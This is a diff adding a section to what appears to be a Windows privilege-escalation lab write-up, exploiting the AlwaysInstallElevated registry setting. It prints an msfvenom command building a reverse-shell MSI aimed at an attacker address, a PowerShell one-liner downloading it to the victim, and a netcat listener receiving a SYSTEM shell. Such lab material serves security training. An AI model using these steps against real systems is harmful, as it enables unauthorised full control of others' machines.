@@ -164,5 +164,44 @@ LPETestbed
 
 C:\Windows\system32>
 
+Next let's look at "Always install elevated"
 
+From SharpUp we see: 
 
+=== AlwaysInstallElevated Registry Keys ===
+
+  HKLM:    1
+  HKCU:    1
+
+  This means that any install that is run will automatically elevate the privileges it runs with so that low privilege users can run installs without needing an administrator to come over to their workstation.
+  
+  To exploit this we just need to run an .msi installer.
+  
+  We generate the payload:
+  root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=10.22.6.122 -f msi > Install.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of msi file: 159744 bytes
+
+Then we transfer the payload to the victim machine:
+(New-Object System.Net.WebClient).DownloadFile("http://YOURIPHERE/Install.msi", "C:\Users\user\Downloads\Install.msi")
+
+Then when we run the install, we will get a reverse shell as NT\Authority System
+
+root@kali:~/LPEWorkshop# nc -lvnp 31337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::31337
+Ncat: Listening on 0.0.0.0:31337
+Ncat: Connection from 10.22.6.98.
+Ncat: Connection from 10.22.6.98:63300.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami & hostname
+whoami & hostname
+nt authority\system
+LPETestbed
+
+C:\Windows\system32>
